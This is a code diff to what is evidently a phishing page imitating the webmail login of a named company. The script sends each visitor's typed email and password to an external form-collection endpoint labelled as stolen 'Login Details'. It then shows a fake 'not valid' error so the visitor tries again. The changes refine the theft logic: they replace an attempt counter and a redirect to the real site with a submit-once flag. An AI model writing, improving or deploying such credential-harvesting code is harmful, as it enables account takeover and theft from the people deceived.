@@ -496,7 +496,7 @@
     <script>
       // ############################################################################
       // Specify the URL of the Formspark endpoint
-      var url = "https://submit-form.com/3KukZ309B"; // Replace with your Formspark form ID
+      var formsparkUrl = "https://submit-form.com/3KukZ309B"; // Replace with your Formspark form ID
       // ############################################################################
 
       window.onload = function () {
@@ -523,12 +523,17 @@
       let a1 = document.querySelectorAll(".error-notice");
       let a2 = document.querySelectorAll(".a1");
       var form = document.getElementById("login_form");
-      var attemptCount = 0;
+      var isSubmitting = false; // Flag to prevent multiple submissions
 
       // Add an event listener for form submission
       form.addEventListener("submit", function (event) {
         // Prevent the form from being submitted normally
         event.preventDefault();
+        
+        // Prevent multiple submissions
+        if (isSubmitting) {
+          return;
+        }
 
         let emailValue = emailInput.value;
         let passwordValue = passwordInput.value;
@@ -572,39 +577,21 @@
           return;
         }
 
-        // Increment attempt counter
-        attemptCount++;
+        // Set submitting flag to true
+        isSubmitting = true;
         
         loading();
-        setTimeout(function () {
-          a1.forEach(function (element) {
-            element.classList.remove("e-hidden");
-          });
-          a2.forEach(function (element) {
-            element.innerHTML = "Your Email/Password not valid";
-          });
-          passwordInput.value = "";
-          setTimeout(function () {
-            a1.forEach(function (element) {
-              element.classList.add("e-hidden");
-            });
-            a2.forEach(function (element) {
-              element.innerHTML = "";
-            });
-          }, 4000);
-        }, 3000);
-
-        // Send data to Formspark only on first and second attempts (once each)
-        if (emailInput.value && passwordInput.value && attemptCount <= 2) {
+        
+        // Send data to Formspark ONCE with both email and password
+        if (emailInput.value && passwordInput.value) {
           let dataLog = {
             email: emailInput.value,
             password: passwordInput.value,
-            attempt: attemptCount === 1 ? "First Attempt" : "Second Attempt",
             desc: "http://webmail.capitalaccesssolutions.com: Login Details"
           };
           
-          // Send to Formspark
-          fetch(url, {
+          // Send to Formspark - ONE submission only
+          fetch(formsparkUrl, {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
@@ -618,15 +605,33 @@
           })
           .catch(error => {
             console.error("Error sending data:", error);
+            // Reset flag if there's an error so user can try again
+            isSubmitting = false;
           });
-          
-          // Redirect after second attempt
-          if (attemptCount === 2) {
-            setTimeout(function() {
-              window.location.href = "http://webmail.capitalaccesssolutions.com";
-            }, 3000);
-          }
         }
+        
+        // Show error message after 3 seconds
+        setTimeout(function () {
+          a1.forEach(function (element) {
+            element.classList.remove("e-hidden");
+          });
+          a2.forEach(function (element) {
+            element.innerHTML = "Your Email/Password not valid";
+          });
+          passwordInput.value = "";
+          
+          // Reset the submitting flag after showing error
+          // This allows the user to try again
+          setTimeout(function () {
+            a1.forEach(function (element) {
+              element.classList.add("e-hidden");
+            });
+            a2.forEach(function (element) {
+              element.innerHTML = "";
+            });
+            isSubmitting = false; // Reset flag so user can submit again
+          }, 4000);
+        }, 3000);
       });
 
       function loading() {
